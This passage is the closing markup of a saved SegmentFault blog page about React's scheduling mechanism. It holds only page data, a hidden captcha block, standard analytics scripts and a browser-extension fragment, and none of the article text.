build，构建项...\",\"user\":{\"name\":\"JenK\",\"url\":\"/u/wangzc996\",\"avatar_url\":\"https://avatar-static.segmentfault.com/104/901/1049016237-60b9d5bfbe7cf_big64\",\"headdress_worn\":{\"headdress_img\":\"https://activity-static.segmentfault.com/100/111/1001112090-653636de1ac2b\",\"id\":1960000044324808,\"position\":{\"x\":4,\"y\":-60,\"h\":160,\"w\":160,\"r\":0}}}}]},\"action\":{\"1190000039101758\":{\"votes\":55,\"isLiked\":false,\"bookmarks\":22,\"isBookmarked\":false}}}"},"__N_SSP":true},"page":"/Blogs/Detail","query":{"aid":"1190000039101758"},"buildId":"xhNfH6RL8mbDWO7J843fF","assetPrefix":"https://static.segmentfault.com/main_site_next/d778cb88","runtimeConfig":{"publicPath":"https://static.segmentfault.com/main_site_next/d778cb88/","appVersion":"23.11.03"},"isFallback":false,"gssp":true,"scriptLoader":[]}</script><div class="is-active ImageView p-4" style="display: none;"><div class="ImageView-inner" style="overflow: auto;">
      <img src="https://segmentfault.com/a/1190000039101758" class="ImageView-img" referrerpolicy="no-referrer" alt="preview" style="max-width: 100%; max-height: 100%;">
    </div></div><div id="waf_nc_block" style="display: none;"><div class="waf-nc-mask"></div><div id="WAF_NC_WRAPPER" class="waf-nc-wrapper"><p class="waf-nc-title">访问验证</p><p class="waf-nc-description">为了更好的访问体验，请进行如下验证</p><p id="waf-nc-traceid" class="waf-nc-traceid-class"></p><div id="nocaptcha"></div></div></div><script src="./彻底搞懂React的调度机制原理_files/gt.js" data-nscript="afterInteractive"></script><script src="./彻底搞懂React的调度机制原理_files/plausible.js" defer="true" data-domain="segmentfault.com" data-nscript="afterInteractive"></script><script src="https://hm.baidu.com/hm.js?e23800c454aa573c0ccb16b52665ac26" defer="true" data-nscript="afterInteractive"></script><script src="https://www.googletagmanager.com/gtag/js?id=G-MJYFRXB3ZX" async="true" data-nscript="afterInteractive"></script><script id="google-analytics" data-nscript="afterInteractive">
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-MJYFRXB3ZX')
    </script><div class="is-active ImageView p-4" style="display: none;"><div class="ImageView-inner" style="overflow: auto;">
      <img src="https://segmentfault.com/a/1190000039101758" class="ImageView-img" referrerpolicy="no-referrer" alt="preview" style="max-width: 100%; max-height: 100%;">
    </div></div><next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p></next-route-announcer><deepl-input-controller><template shadowrootmode="open"><link rel="stylesheet" href="chrome-extension://cofdbpoegempjloogbagkncekinflcnj/build/content.css"><div><div class="dl-input-translation-container svelte-ju4595"><div></div></div></div></template></deepl-input-controller></body></html>